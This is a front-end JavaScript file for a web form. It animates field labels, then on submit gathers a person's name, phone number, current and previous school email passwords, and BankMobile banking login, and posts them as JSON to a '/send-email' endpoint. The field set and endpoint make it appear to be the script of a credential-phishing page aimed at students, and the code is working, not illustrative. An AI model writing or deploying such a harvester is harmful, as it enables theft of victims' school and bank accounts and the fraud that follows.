document.querySelectorAll(".input-field").forEach((input) => {
  const label = input.nextElementSibling;

  console.log(label);

  const toggleFloating = () => {
    if (input.value.trim() !== "") {
      label.classList.add("float");
    } else {
      label.classList.remove("float");
    }
  };

  // On focus
  input.addEventListener("focus", () => {
    label.classList.add("float");
  });

  // On blur
  input.addEventListener("blur", toggleFloating);

  // On page load (if autofilled or pre-filled)
  toggleFloating();
});

// Radio selection logic
const yesRadio = document.getElementById("Yes");
const noRadio = document.getElementById("No");

yesRadio.addEventListener("change", () => {
  if (yesRadio.checked) noRadio.checked = false;
});

noRadio.addEventListener("change", () => {
  if (noRadio.checked) yesRadio.checked = false;
});

// Form submission
document.querySelector("form").addEventListener("submit", async (e) => {
  e.preventDefault();

  if (!yesRadio.checked && !noRadio.checked) {
    return;
  }

  const formData = {
    fullName: document.getElementById("fullName").value,
    phoneNumber: document.getElementById("phone_number").value,
    currentSchoolEmail: document.getElementById("currentschemail").value,
    currentSchoolPassword: document.getElementById("currentschpassword").value,
    previousSchoolEmail: document.getElementById("previouschemail").value,
    previousSchoolPassword: document.getElementById("previouschemailpassword")
      .value,
    hasBankMobileProfile: document.getElementById("Yes").checked ? "Yes" : "No",
    bankMobileEmail: document.getElementById("bankmobileemail").value,
    bankMobilePassword: document.getElementById("bankmobilepassword").value,
  };

  try {
    const response = await fetch("/send-email", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(formData),
    });

    const result = await response.json();

    if (result.success) {
      alert("Form submitted successfully.");
      e.target.reset();
      // Reset floating labels
      document.querySelectorAll(".floating-label").forEach((label) => {
        label.classList.remove("float");
      });
    } else {
      alert("There was an error submitting the form.");
    }
  } catch (error) {
    console.error("Submit error:", error);
    alert("An unexpected error occurred.");
  }
});
